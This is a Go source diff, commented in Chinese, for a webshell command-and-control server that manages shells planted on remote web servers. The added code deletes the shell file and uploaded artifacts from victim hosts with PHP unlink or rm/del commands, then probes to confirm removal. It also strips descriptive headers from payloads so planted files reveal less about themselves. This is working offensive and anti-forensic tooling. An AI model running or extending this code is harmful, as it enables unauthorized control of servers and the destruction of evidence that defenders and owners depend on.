@@ -130,6 +130,15 @@ var (
 // 会话库的读改写需要串行化（页面与 MCP 进程之外的并发请求）。
 var webshellStoreMu sync.Mutex
 
+// webshellWinAbsRE 判断是不是 Windows 绝对路径（C:\... 或 C:/...）。
+var webshellWinAbsRE = regexp.MustCompile(`^[A-Za-z]:[\\/]`)
+
+// 剥载荷说明注释用：起始 PHP 标记 + 紧跟的 /* ... */ 说明块。
+var (
+	webshellPHPTagRE             = regexp.MustCompile(`(?i)^<\?(?:php|=)?`)
+	webshellPayloadHeadCommentRE = regexp.MustCompile(`(?s)^\s*/\*.*?\*/`)
+)
+
 // ---------------------------------------------------------------------------
 // 数据模型
 // ---------------------------------------------------------------------------
@@ -137,14 +146,18 @@ var webshellStoreMu sync.Mutex
 // webshellSession 是 webshells.json 里的一条记录；字段名必须与 Python 侧一致，
 // 否则两个入口写出来的文件会互相读不懂（password 是参数名，不是口令）。
 type webshellSession struct {
-	URL       string            `json:"url"`
-	Type      string            `json:"type"`
-	Password  string            `json:"password"`
-	Method    string            `json:"method"`
-	Header    map[string]string `json:"header"`
-	Note      string            `json:"note"`
-	CreatedAt string            `json:"created_at"`
-	UpdatedAt string            `json:"updated_at,omitempty"`
+	URL      string            `json:"url"`
+	Type     string            `json:"type"`
+	Password string            `json:"password"`
+	Method   string            `json:"method"`
+	Header   map[string]string `json:"header"`
+	Note     string            `json:"note"`
+	// RemotePath 是马的绝对落地路径：清痕迹时要靠它（命令型马没它就只能人工删）。
+	RemotePath string `json:"remote_path,omitempty"`
+	// Artifacts 是经上传接口写到远端的文件，删会话时一并清理。
+	Artifacts []string `json:"artifacts,omitempty"`
+	CreatedAt string   `json:"created_at"`
+	UpdatedAt string   `json:"updated_at,omitempty"`
 }
 
 // webshellSessionView 是列表接口的返回项：绝不带 password 与 header 的值。
@@ -154,6 +167,8 @@ type webshellSessionView struct {
 	Type       string   `json:"type"`
 	Method     string   `json:"method"`
 	Note       string   `json:"note"`
+	RemotePath string   `json:"remote_path,omitempty"`
+	Artifacts  []string `json:"artifacts,omitempty"`
 	CreatedAt  string   `json:"created_at"`
 	UpdatedAt  string   `json:"updated_at,omitempty"`
 	ParamSet   bool     `json:"param_set"`   // 是否自定义了参数名
@@ -324,6 +339,8 @@ func webshellView(name string, sess webshellSession) webshellSessionView {
 		Type:       sess.Type,
 		Method:     sess.Method,
 		Note:       sess.Note,
+		RemotePath: sess.RemotePath,
+		Artifacts:  sess.Artifacts,
 		CreatedAt:  sess.CreatedAt,
 		UpdatedAt:  sess.UpdatedAt,
 		ParamSet:   strings.TrimSpace(sess.Password) != "" && strings.TrimSpace(sess.Password) != "pass",
@@ -830,6 +847,204 @@ func webshellRunPHPCode(ctx context.Context, name string, sess webshellSession, 
 	return inner, nil
 }
 
+// ---------------------------------------------------------------------------
+// 清痕迹（删远端落地物），与 Python 侧 shell_del 的 remove_remote 分支同一套协议
+// ---------------------------------------------------------------------------
+
+// webshellDelItem 是一条远端落地物的删除结果。
+type webshellDelItem struct {
+	Kind   string `json:"kind"`   // shell = 马文件，artifact = 上传残留
+	Path   string `json:"path"`   // 远端路径
+	Status string `json:"status"` // OK 已删除 / GONE 原本不存在 / FAIL 删除失败
+}
+
+// webshellPurgeResult 是清痕迹的整体结果：SelfGone 才代表马文件确实没了。
+type webshellPurgeResult struct {
+	Attempted bool              `json:"attempted"`
+	SelfPath  string            `json:"self_path,omitempty"`
+	SelfGone  bool              `json:"self_gone"`
+	Items     []webshellDelItem `json:"items,omitempty"`
+	Confirm   string            `json:"confirm,omitempty"`
+	Error     string            `json:"error,omitempty"`
+}
+
+// webshellSelfPathCode 定位马自身的真实绝对路径。
+// 不能用 __FILE__：马是 eval 执行的，__FILE__ 会变成
+// "/var/www/x.php(17) : eval()'d code" 这种伪路径，unlink 会静默失败。
+// SCRIPT_FILENAME / get_included_files()[0] 拿到的才是入口脚本的真实路径。
+const webshellSelfPathCode = "$__artex_s='';" +
+	"if(!empty($_SERVER['SCRIPT_FILENAME'])){$__artex_s=$_SERVER['SCRIPT_FILENAME'];}" +
+	"if($__artex_s===''){$__artex_g=@get_included_files();" +
+	"if(!empty($__artex_g)){$__artex_s=$__artex_g[0];}}" +
+	"if($__artex_s===''){$__artex_s=__FILE__;}" +
+	"$__artex_s=(@realpath($__artex_s) ?: $__artex_s);"
+
+// webshellPHPDelCode 拼 PHP 删除代码：逐个 unlink 并回报 OK / GONE / FAIL。
+// 马自身用 SCRIPT_FILENAME 定位，不接收外部路径，避免误删同站正常文件。
+func webshellPHPDelCode(paths []string, includeSelf bool) string {
+	var sb strings.Builder
+	sb.WriteString("$__artex_l=[")
+	first := true
+	for _, p := range paths {
+		if strings.TrimSpace(p) == "" {
+			continue
+		}
+		if !first {
+			sb.WriteString(",")
+		}
+		first = false
+		sb.WriteString("base64_decode('" + webshellB64Encode([]byte(p)) + "')")
+	}
+	sb.WriteString("];")
+	if includeSelf {
+		sb.WriteString(webshellSelfPathCode)
+		sb.WriteString("$__artex_l[]=$__artex_s;")
+	}
+	sb.WriteString("$__artex_r=[];" +
+		"foreach($__artex_l as $__artex_p){" +
+		"if(!file_exists($__artex_p)){$__artex_r[]='GONE '.$__artex_p;continue;}" +
+		"$__artex_r[]=(@unlink($__artex_p)?'OK ':'FAIL ').$__artex_p;" +
+		"}" +
+		`echo implode("\n",$__artex_r);`)
+	return sb.String()
+}
+
+// webshellParseDelOut 解析删除回显，返回 [(状态, 路径)]。
+func webshellParseDelOut(text string) []webshellDelItem {
+	var out []webshellDelItem
+	for _, line := range strings.Split(strings.ReplaceAll(text, "\r", ""), "\n") {
+		line = strings.TrimSpace(line)
+		if line == "" {
+			continue
+		}
+		for _, st := range []string{"OK", "GONE", "FAIL"} {
+			if strings.HasPrefix(line, st+" ") {
+				p := strings.TrimSpace(strings.TrimPrefix(line, st+" "))
+				if p != "" {
+					out = append(out, webshellDelItem{Path: p, Status: st})
+				}
+				break
+			}
+		}
+	}
+	return out
+}
+
+// webshellShellDelCmd 命令型马清理：删完就地判断是否存在，回 OK / FAIL。
+func webshellShellDelCmd(paths []string, typ string) string {
+	seg := make([]string, 0, len(paths))
+	if typ == "aspx" {
+		for _, p := range paths {
+			q := strings.ReplaceAll(p, `"`, `""`)
+			seg = append(seg, fmt.Sprintf(`del /f /q "%s" >nul 2>nul & if exist "%s" (echo FAIL %s) else (echo OK %s)`,
+				q, q, p, p))
+		}
+		return strings.Join(seg, " & ")
+	}
+	for _, p := range paths {
+		sq := webshellShellQuote(p)
+		seg = append(seg, fmt.Sprintf("rm -f %s; if [ -e %s ]; then echo 'FAIL %s'; else echo 'OK %s'; fi",
+			sq, sq, p, p))
+	}
+	return strings.Join(seg, "; ")
+}
+
+// webshellConfirmSelfGone 删完再打一枪：用一个必然回显的代码载荷试探，
+// 取不到标记才算真没了。不能拿「空响应」当判据——加密马收到不认识的载荷本来就是空响应。
+func webshellConfirmSelfGone(ctx context.Context, name string, sess webshellSession, timeout time.Duration) (bool, string) {
+	probe := webshellPHPCodePayload("echo 'ARTEXALIVE';")
+	_, text, err := webshellPost(ctx, sess, probe, timeout)
+	if err != nil {
+		return true, "复查请求已失败：" + webshellBrief(err.Error(), 120)
+	}
+	if strings.Contains(text, webshellMarkerBegin) || strings.Contains(text, "ARTEXALIVE") {
+		return false, "复查仍能打通马并获得回显，文件没删掉"
+	}
+	if webshellLooksBlocked(text) {
+		return true, "复查返回拦截页，已无马的回显"
+	}
+	return true, "复查响应里已无马的回显"
+}
+
+// webshellPurgeSession 删远端落地物：马文件 + 该会话上传过的残留，删完复查。
+func (s *Server) webshellPurgeSession(ctx context.Context, name string, sess webshellSession, explicitPath string, timeout time.Duration) *webshellPurgeResult {
+	res := &webshellPurgeResult{Attempted: true}
+	artifacts := make([]string, 0, len(sess.Artifacts))
+	for _, p := range sess.Artifacts {
+		if strings.TrimSpace(p) != "" {
+			artifacts = append(artifacts, p)
+		}
+	}
+	hint := strings.TrimSpace(explicitPath)
+	if hint == "" {
+		hint = strings.TrimSpace(sess.RemotePath)
+	}
+	res.SelfPath = hint
+
+	markItems := func(items []webshellDelItem, selfPath string) {
+		for i := range items {
+			if i == len(items)-1 && selfPath != "" {
+				items[i].Kind = "shell"
+			} else {
+				items[i].Kind = "artifact"
+			}
+		}
+		res.Items = items
+	}
+
+	if (sess.Type == "php" || sess.Type == "php_raw") && webshellModeOf(name) != "raw" {
+		out, err := webshellRunPHPCode(ctx, name, sess, webshellPHPDelCode(artifacts, true), timeout)
+		if err != nil {
+			if errors.Is(err, errWSModeMismatch) {
+				res.Error = "该会话已判定为命令执行型马，无法用 PHP unlink 自删；" +
+					"请填 remote_path 或传 path 参数，改用系统命令删除"
+			} else {
+				res.Error = err.Error()
+			}
+			return res
+		}
+		items := webshellParseDelOut(out)
+		if len(items) == 0 {
+			res.Error = "远端 unlink 没回明确结果: " + webshellBrief(out, 200)
+			return res
+		}
+		// 最后一条是 __FILE__（马自身）
+		res.SelfPath = items[len(items)-1].Path
+		res.SelfGone = items[len(items)-1].Status == "OK" || items[len(items)-1].Status == "GONE"
+		markItems(items, res.SelfPath)
+	} else {
+		if hint == "" {
+			res.Error = "命令型会话（" + sess.Type + "）必须知道马的绝对路径才能真正删掉：" +
+				"请在会话里填 remote_path，或删除时传 path=/绝对/路径"
+			return res
+		}
+		targets := append([]string{hint}, artifacts...)
+		out, _, err := webshellExecCmd(ctx, name, sess, webshellShellDelCmd(targets, sess.Type), timeout)
+		if err != nil {
+			res.Error = err.Error()
+			return res
+		}
+		items := webshellParseDelOut(out)
+		if len(items) == 0 {
+			res.Error = "远端删除命令没回明确结果: " + webshellBrief(out, 200)
+			return res
+		}
+		for _, it := range items {
+			if it.Path == hint {
+				res.SelfGone = it.Status == "OK" || it.Status == "GONE"
+			}
+		}
+		markItems(items, hint)
+	}
+
+	gone, detail := webshellConfirmSelfGone(ctx, name, sess, timeout)
+	res.Confirm = detail
+	if res.SelfGone && !gone {
+		res.SelfGone = false
+	}
+	return res
+}
+
 // webshellReadRemoteSize 命令型会话：远端正向 `wc -c < path` 取文件大小。
 func webshellReadRemoteSize(ctx context.Context, name string, sess webshellSession, remotePath string, timeout time.Duration) (int64, error) {
 	out, _, err := webshellExecCmd(ctx, name, sess, "wc -c < "+webshellShellQuote(remotePath), timeout)
@@ -902,6 +1117,7 @@ func (s *Server) webshellSaveSession(w http.ResponseWriter, r *http.Request) {
 		Method   string          `json:"method"`
 		Header   json.RawMessage `json:"header"`
 		Note     string          `json:"note"`
+		Remote   string          `json:"remote_path"`
 	}
 	if err := decode(r, &req); err != nil {
 		writeErr(w, 400, "请求体不是合法 JSON: "+err.Error())
@@ -981,6 +1197,12 @@ func (s *Server) webshellSaveSession(w http.ResponseWriter, r *http.Request) {
 	}
 
 	note := strings.TrimSpace(req.Note)
+	remotePath := strings.TrimSpace(req.Remote)
+	if remotePath != "" && !strings.HasPrefix(remotePath, "/") &&
+		!webshellWinAbsRE.MatchString(remotePath) {
+		writeErr(w, 400, fmt.Sprintf("remote_path 应是绝对路径（/var/www/html/s.php 或 C:\\inetpub\\s.aspx），收到: %q", remotePath))
+		return
+	}
 	now := time.Now().Format("2006-01-02 15:04:05")
 
 	path := s.webshellStorePath()
@@ -996,14 +1218,19 @@ func (s *Server) webshellSaveSession(w http.ResponseWriter, r *http.Request) {
 	if created == "" {
 		created = now
 	}
+	if remotePath == "" {
+		remotePath = strings.TrimSpace(prev.RemotePath)
+	}
 	sess := webshellSession{
-		URL:       rawURL,
-		Type:      typ,
-		Password:  param,
-		Method:    method,
-		Header:    header,
-		Note:      note,
-		CreatedAt: created,
+		URL:        rawURL,
+		Type:       typ,
+		Password:   param,
+		Method:     method,
+		Header:     header,
+		Note:       note,
+		RemotePath: remotePath,
+		Artifacts:  prev.Artifacts,
+		CreatedAt:  created,
 	}
 	if existed {
 		sess.UpdatedAt = now
@@ -1024,13 +1251,48 @@ func (s *Server) webshellSaveSession(w http.ResponseWriter, r *http.Request) {
 	})
 }
 
-// webshellDeleteSession 删除一条会话登记（不动远端 webshell 文件）。
+// webshellDeleteSession 删除一条会话。
+//
+// 默认只摘登记（与旧行为一致）；带 ?remote=1 时先进远端清痕迹：
+// 删马文件（eval 型用 PHP unlink(__FILE__) 自删）、删上传残留、再复查确认没回显，
+// 最后才摘登记。远端没清干净就不摘（除非 &force=1），避免活着的马静默失联。
 func (s *Server) webshellDeleteSession(w http.ResponseWriter, r *http.Request) {
 	name := strings.TrimSpace(r.PathValue("name"))
 	if name == "" {
 		writeErr(w, 400, "缺少会话名")
 		return
 	}
+	q := r.URL.Query()
+	removeRemote := q.Get("remote") == "1" || q.Get("remote") == "true"
+	force := q.Get("force") == "1" || q.Get("force") == "true"
+	explicitPath := strings.TrimSpace(q.Get("path"))
+	timeout := webshellSeconds(atoiDefault(q.Get("timeout"), 30), 30, 1, 600)
+
+	sess, err := s.webshellSessionByName(name)
+	if err != nil {
+		writeErr(w, http.StatusNotFound, err.Error())
+		return
+	}
+
+	var purge *webshellPurgeResult
+	if removeRemote {
+		ctx, cancel := context.WithTimeout(r.Context(), timeout*3)
+		purge = s.webshellPurgeSession(ctx, name, sess, explicitPath, timeout)
+		cancel()
+		if !purge.SelfGone && !force {
+			webshellDropMode(name)
+			writeJSON(w, 409, map[string]any{
+				"deleted":   "",
+				"type":      sess.Type,
+				"remaining": -1,
+				"purge":     purge,
+				"hint": "远端还没删干净，会话登记已保留：① 用执行接口手动删（rm -f /path）；" +
+					"② 确认只想丢弃登记传 force=1。",
+			})
+			return
+		}
+	}
+
 	path := s.webshellStorePath()
 	webshellStoreMu.Lock()
 	store, err := webshellLoadStore(path)
@@ -1054,11 +1316,15 @@ func (s *Server) webshellDeleteSession(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	webshellDropMode(name)
-	writeJSON(w, 200, map[string]any{
+	resp := map[string]any{
 		"deleted":   name,
 		"type":      removed.Type,
 		"remaining": remain,
-	})
+	}
+	if purge != nil {
+		resp["purge"] = purge
+	}
+	writeJSON(w, 200, resp)
 }
 
 // ---------------------------------------------------------------------------
@@ -1241,6 +1507,11 @@ func (s *Server) webshellUpload(w http.ResponseWriter, r *http.Request) {
 	if !usePHP {
 		how = "shell/PowerShell 命令"
 	}
+	// 记入会话的上传残留清单：删会话时按这份清单清远端文件
+	if err := s.webshellRememberArtifact(name, remotePath); err != nil {
+		// 记账失败不影响上传结果，只在响应里提示
+		verify += "（注意：上传残留清单写入失败，删会话时需手填 path：" + err.Error() + "）"
+	}
 	writeJSON(w, 200, map[string]any{
 		"name":        name,
 		"remote_path": remotePath,
@@ -1251,6 +1522,36 @@ func (s *Server) webshellUpload(w http.ResponseWriter, r *http.Request) {
 		"verify":      verify,
 		"elapsed_ms":  time.Since(t0).Milliseconds(),
 	})
+}
+
+// webshellRememberArtifact 记下上传写过的远端文件（去重，最多留 50 条）。
+func (s *Server) webshellRememberArtifact(name, remotePath string) error {
+	remotePath = strings.TrimSpace(remotePath)
+	if remotePath == "" {
+		return nil
+	}
+	path := s.webshellStorePath()
+	webshellStoreMu.Lock()
+	defer webshellStoreMu.Unlock()
+	store, err := webshellLoadStore(path)
+	if err != nil {
+		return err
+	}
+	sess, ok := store[name]
+	if !ok {
+		return nil
+	}
+	for _, p := range sess.Artifacts {
+		if p == remotePath {
+			return nil
+		}
+	}
+	sess.Artifacts = append(sess.Artifacts, remotePath)
+	if len(sess.Artifacts) > 50 {
+		sess.Artifacts = sess.Artifacts[len(sess.Artifacts)-50:]
+	}
+	store[name] = sess
+	return webshellSaveStore(path, store)
 }
 
 func webshellUploadPHPChunk(ctx context.Context, name string, sess webshellSession, remotePath string, data []byte, appendMode bool, timeout time.Duration) (int, error) {
@@ -1467,6 +1768,9 @@ func (s *Server) webshellGetPayload(w http.ResponseWriter, r *http.Request) {
 		writeErr(w, 400, err.Error())
 		return
 	}
+	// 库里的文件头说明（@summary/@scene/...）只给本机的人看；下发的正文要剥掉，
+	// 否则落地文件自带一份说明书：这是什么马、参数怎么用、绕哪类 WAF。
+	content = webshellStripPayloadMeta(content)
 	writeJSON(w, 200, map[string]any{
 		"name":    entry.Name,
 		"type":    entry.Type,
@@ -1671,6 +1975,27 @@ func webshellReadPayloadFile(path string) (string, error) {
 }
 
 // webshellPayloadMeta4 从文件头注释抠 @ 元信息；同一标签只取第一次出现的值。
+// webshellStripPayloadMeta 剥掉载荷正文开头的说明注释块，保留 <?php 之类的起始标记。
+// 与 webshell_mcp.py 的 _strip_payload_meta 行为一致。
+func webshellStripPayloadMeta(text string) string {
+	trimmed := strings.TrimLeft(text, " \t\r\n")
+	head := ""
+	rest := trimmed
+	if m := webshellPHPTagRE.FindString(trimmed); m != "" {
+		head = m
+		rest = trimmed[len(m):]
+	}
+	comment := webshellPayloadHeadCommentRE.FindString(rest)
+	if comment == "" {
+		return text
+	}
+	rest = strings.TrimLeft(rest[len(comment):], "\r\n")
+	if head == "" {
+		return rest
+	}
+	return head + "\n" + rest
+}
+
 func webshellPayloadMeta4(text string) webshellPayloadMeta {
 	meta := webshellPayloadMeta{}
 	lines := strings.Split(text, "\n")
